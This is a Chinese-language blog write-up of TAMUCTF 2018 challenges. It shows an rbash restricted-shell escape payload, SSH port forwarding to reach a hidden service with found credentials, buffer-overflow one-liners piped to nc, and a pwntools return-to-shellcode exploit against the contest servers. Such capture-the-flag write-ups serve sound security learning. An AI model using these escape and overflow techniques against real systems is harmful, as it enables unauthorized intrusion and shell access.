@@ -1,0 +1,110 @@
+<!DOCTYPE html><html lang="[&quot;zh-tw&quot;,&quot;en&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.0.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.0.1" type="image/png" sizes="32x32"><meta name="description" content="太多情境題了web 滿滿的水題有點無言只寫一些值得紀錄的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TAMUCTF-2018">
+<meta property="og:url" content="https://blog.racterub.me/zh-tw/2018/tamuctf-2018/">
+<meta property="og:site_name" content="Racterub&#39;s Blog">
+<meta property="og:description" content="太多情境題了web 滿滿的水題有點無言只寫一些值得紀錄的">
+<meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2018-02-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-06-28T19:40:49.011Z">
+<meta property="article:author" content="Racter">
+<meta name="twitter:card" content="summary"><meta name="keywords" content="Racter, Racterub's Blog"><meta name="description" content=""><title>TAMUCTF-2018 | Racterub's Blog</title><link ref="canonical" href="https://blog.racterub.me/zh-tw/2018/tamuctf-2018/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.0.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: undefined,
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"ocean","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: true,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Racterub's Blog" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Racterub's Blog" type="application/rss+xml">
+</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">TAMUCTF-2018</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2018-02-27</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2020-06-29</span></span></div></header><div class="post-body"><p>太多情境題了<br>web 滿滿的水題有點無言<br>只寫一些值得紀錄的</p>
+<a id="more"></a>
+
+
+        <h2 id="Misc">
+          <a href="#Misc" class="heading-link"><i class="fas fa-link"></i></a>Misc</h2>
+      
+        <h3 id="you-can-run-you-can-hide-25">
+          <a href="#you-can-run-you-can-hide-25" class="heading-link"><i class="fas fa-link"></i></a>you can run, you can hide [25]</h3>
+      <figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find the hidden flag.</span><br><span class="line"></span><br><span class="line">ssh tamuctf@shell1.ctf.tamu.edu -p 2223</span><br><span class="line">password: tamuctf</span><br></pre></td></tr></tbody></table></div></figure>
+
+<p>ssh 進去之後發現他是用<code>rbash</code>，意外在網路上找到神奇 payload (到現在還不知道原理)<br><code>BASH_CMDS[a]=/bin/sh;a</code><br><span class="exturl"><a class="exturl__link" href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html" target="_blank" rel="noopener">Source</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>目錄裡面直接就有flag了<br><code>gigem{TAMU_secret_society_qSD358OUYGcezTlFbqeh}</code></p>
+<p>後面神隊友給了另一個 payload (在看連入的連線的時候發現好像大部分都是這樣連入的)<br><code>ssh tamuctf@shell1.ctf.tamu.edu -p 2223 -t "bash --noprofile"</code></p>
+
+        <h3 id="enum-150">
+          <a href="#enum-150" class="heading-link"><i class="fas fa-link"></i></a>enum [150]</h3>
+      <figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Find the hidden flag.</span><br><span class="line">You do not need to bruteforce. Don't do it.</span><br><span class="line"></span><br><span class="line">ssh tamuctf@shell2.ctf.tamu.edu -p 2222</span><br><span class="line">password: tamuctf</span><br></pre></td></tr></tbody></table></div></figure>
+
+<p>這題卡很久，最後靠隊友 carry<br>連續前面一題，繞過之後我一開始在<code>/var/backups/</code>找到<code>.srv.bak</code>，裡面放了帳號跟密碼<br>後來就是隊友carry的部分了<br>用<code>ps aux</code>指令發現有一個程序是執行<code>/bin/bash -c /usr/sbin/service ssh restart &amp;&amp; cd /.administrators &amp;&amp; /usr/bin/python /.administrators/pyserver.py 9000</code><br>後來在自己的電腦執行<code>ssh -L 1234:localhost:9000 tamuctf@shell2.ctf.tamu.edu -p 2222</code>(port forwarding)，在自己的瀏覽器開啟<code>localhost:1234</code>再輸入之前找到的帳號密碼就可以得到 flag  了<br><code>gigem{pivot_piv0t_P1V0T_20975430987aff92qf89qf}</code></p>
+
+        <h2 id="Pwn">
+          <a href="#Pwn" class="heading-link"><i class="fas fa-link"></i></a>Pwn</h2>
+      
+        <h3 id="Pwn1">
+          <a href="#Pwn1" class="heading-link"><i class="fas fa-link"></i></a>Pwn1</h3>
+      <p>只是覆蓋<code>cmp DWORD PTR [ebp-0xc],0xf007ba11</code>而已</p>
+<p>Payload:</p>
+<figure class="highlight bash"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*23 + '\x11\xba\x07\xf0'"</span> | nc pwn.ctf.tamu.edu 4321</span><br></pre></td></tr></tbody></table></div></figure>
+
+
+        <h3 id="Pwn2">
+          <a href="#Pwn2" class="heading-link"><i class="fas fa-link"></i></a>Pwn2</h3>
+      <p>執行<code>echo</code>函式時，可以 Overflow 跳到<code>print_flag</code></p>
+<p>Payload:</p>
+<figure class="highlight bash"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*243 + '\x4b\x85\x04\x08'"</span> | nc pwn.ctf.tamu.edu 4322</span><br></pre></td></tr></tbody></table></div></figure>
+
+
+        <h3 id="Pwn3">
+          <a href="#Pwn3" class="heading-link"><i class="fas fa-link"></i></a>Pwn3</h3>
+      <p>觀察了一下會發現輸出的 random number 會是 buffer 的起始地址，所以方向就很清楚了 <code>return to shellcode</code></p>
+<p>Payload:</p>
+<figure class="highlight python"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./pwn3')</span></span><br><span class="line"><span class="comment">#r = remote('0.0.0.0', 8888)</span></span><br><span class="line">r = remote(<span class="string">'pwn.ctf.tamu.edu'</span>, <span class="number">4323</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Your random number '</span>)</span><br><span class="line">addr = int(r.recv(<span class="number">10</span>).strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">'a'</span> * (<span class="number">242</span>-len(shellcode)) + p32(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line"><span class="keyword">print</span> p32(addr)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'?'</span>)</span><br><span class="line"><span class="comment">#raw_input('########')</span></span><br><span class="line">r.sendline(payload)</span><br></pre></td></tr></tbody></table></div></figure>
+
+
+        <h3 id="總結">
+          <a href="#總結" class="heading-link"><i class="fas fa-link"></i></a>總結</h3>
+      <p>我 pwn 跟中邪一樣，payload 我寫都不過，隊友寫都過==<br>這場情境題太多了，感覺不像一般的 CTF 反而比較像政府辦的資安比賽</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://blog.racterub.me">Racter</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://blog.racterub.me/zh-tw/2018/tamuctf-2018/">https://blog.racterub.me/zh-tw/2018/tamuctf-2018/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/zh-tw/2020/ais3-2020/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">AIS3 Pre-Exam 2020</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/zh-tw/2018/bamboofox-2017/"><span class="paginator-prev__text">Bamboofox CTF 2017</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">
+          Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#you-can-run-you-can-hide-25"><span class="toc-number">1.1.</span> <span class="toc-text">
+          you can run, you can hide [25]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enum-150"><span class="toc-number">1.2.</span> <span class="toc-text">
+          enum [150]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">2.</span> <span class="toc-text">
+          Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn1"><span class="toc-number">2.1.</span> <span class="toc-text">
+          Pwn1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn2"><span class="toc-number">2.2.</span> <span class="toc-text">
+          Pwn2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pwn3"><span class="toc-number">2.3.</span> <span class="toc-text">
+          Pwn3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#總結"><span class="toc-number">2.4.</span> <span class="toc-text">
+          總結</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Racterub</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/racterub" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://twitter.com/racterub" target="_blank" rel="noopener" data-popover="Twitter" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-twitter"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">Categories</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Racter</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v4.2.1</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.0.1</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-arrow-up"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/ribbon.js@latest/dist/ribbon.min.js" size="120" alpha="0.6" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="/js/utils.js?v=2.0.1"></script><script src="/js/stun-boot.js?v=2.0.1"></script><script src="/js/scroll.js?v=2.0.1"></script><script src="/js/header.js?v=2.0.1"></script><script src="/js/sidebar.js?v=2.0.1"></script></body></html>
